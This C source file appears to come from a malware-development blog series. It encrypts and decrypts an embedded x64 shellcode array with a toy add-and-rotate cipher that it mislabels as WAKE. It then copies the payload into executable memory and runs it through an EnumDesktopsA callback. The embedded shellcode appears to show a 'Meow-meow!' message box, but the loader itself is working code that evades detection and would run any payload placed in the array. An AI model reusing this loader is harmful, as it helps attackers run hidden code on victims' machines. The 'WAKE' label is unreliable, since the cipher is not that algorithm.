/*
 * hack.c
 * WAKE encrypt/decrypt implementation
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2023/10/20/malware-cryptography-21.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 64

// WAKE key schedule
void key_schedule(uint32_t key, uint32_t schedule[ROUNDS]) {
  schedule[0] = key;
  for (int i = 1; i < ROUNDS; i++) {
    schedule[i] = (schedule[i - 1] + 0x6DC597F) * 0x5851F42D;
  }
}

// WAKE encryption
void wake_encrypt(uint32_t schedule[ROUNDS], uint32_t *data, size_t data_len) {
  for (size_t i = 0; i < data_len; i++) {
    for (int j = 0; j < ROUNDS; j++) {
      data[i] += schedule[j];
      data[i] = (data[i] << 3) | (data[i] >> 29);
    }
  }
}

// WAKE decryption
void wake_decrypt(uint32_t schedule[ROUNDS], uint32_t *data, size_t data_len) {
  for (size_t i = 0; i < data_len; i++) {
    for (int j = ROUNDS - 1; j >= 0; j--) {
      data[i] = (data[i] >> 3) | (data[i] << 29);
      data[i] -= schedule[j];
    }
  }
}

// Add padding to data
void add_padding(unsigned char **data, size_t *data_len) {
  size_t original_len = *data_len;
  size_t new_len = (*data_len + 3) & ~3; // Round up to the nearest 4 bytes
  if (new_len != original_len) {
    unsigned char *new_data = (unsigned char *)malloc(new_len);
    if (new_data == NULL) {
      // Handle memory allocation error
      return;
    }
    memset(new_data, 0, new_len);
    memcpy(new_data, *data, original_len);
    *data = new_data;
    *data_len = new_len;
  }
}

// Remove padding from data
void remove_padding(unsigned char **data, size_t *data_len) {
  // find the last non-zero byte
  int i = *data_len - 1;
  while (i >= 0 && (*data)[i] == 0) {
    i--;
  }

  // Calculate the new length without padding
  size_t new_len = i + 1;
  if (new_len != *data_len) {
    // Create a new buffer without padding
    unsigned char *new_data = (unsigned char *)malloc(new_len);
    if (new_data == NULL) {
      // Handle memory allocation error
      return;
    }
    memcpy(new_data, *data, new_len);
    *data = new_data;
    *data_len = new_len;
  }
}

// Encrypt/decrypt data
void run_payload(unsigned char *data, size_t data_len, uint32_t key) {
  printf("original data:\n");
  for (size_t i = 0; i < data_len; i++) {
    printf("%02x ", data[i]);
  }
  printf("\n\n");

  add_padding(&data, &data_len); // Add padding

  printf("padded data:\n");
  for (size_t i = 0; i < data_len; i++) {
    printf("%02x ", data[i]);
  }
  printf("\n\n");

  size_t num_words = data_len / 4;
  uint32_t *data_words = (uint32_t *)data;

  uint32_t schedule[ROUNDS];
  key_schedule(key, schedule);

  // Encrypt the data
  wake_encrypt(schedule, data_words, num_words);

  printf("encrypted data:\n");
  for (size_t i = 0; i < num_words; i++) {
    // printf("%02X ", data_words[i]);
    for (int j = 0; j < 4; j++) {
      printf("%02x ", (data_words[i] >> (j * 8)) & 0xFF);
    }
    // printf(" "); // Add space between words
  }
  printf("\n\n");

  // Decrypt the data
  wake_decrypt(schedule, data_words, num_words);

  printf("decrypted data:\n");
  for (size_t i = 0; i < num_words; i++) {
    // printf("%08X ", data_words[i]);
    for (int j = 0; j < 4; j++) {
      printf("%02x ", (data_words[i] >> (j * 8)) & 0xFF);
    }
    // printf(" "); // Add space between words
  }
  printf("\n\n");

  remove_padding(&data, &data_len); // Remove padding

  printf("decrypted unpadded data:\n");
  for (size_t i = 0; i < data_len; i++) {
    printf("%02x ", data[i]);
  }
  printf("\n\n");

  LPVOID mem = VirtualAlloc(NULL, data_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, data, data_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
}

int main() {
  unsigned char data[] = {
    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x0, 0x0,
    0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
    0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
    0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0xf, 0xb7, 0x4a,
    0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2,
    0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52,
    0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
    0x1, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0,
    0x74, 0x6f, 0x48, 0x1, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
    0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
    0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75,
    0xf1, 0x3e, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd6,
    0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x3e, 0x41,
    0x8b, 0xc, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x3e,
    0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
    0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
    0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
    0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x0, 0x0, 0x0,
    0x0, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x0, 0x0, 0x0, 0x3e, 0x4c, 0x8d,
    0x85, 0x9, 0x1, 0x0, 0x0, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
    0x56, 0x7, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2,
    0x56, 0xff, 0xd5, 0x4d, 0x65, 0x6f, 0x77, 0x2d, 0x6d, 0x65, 0x6f, 0x77,
    0x21, 0x0, 0x3d, 0x5e, 0x2e, 0x2e, 0x5e, 0x3d, 0x0
  };
  size_t data_len = sizeof(data);

  uint32_t key = 0x01234567; // 32-bit encryption key

  run_payload(data, data_len, key);

  return 0;
}

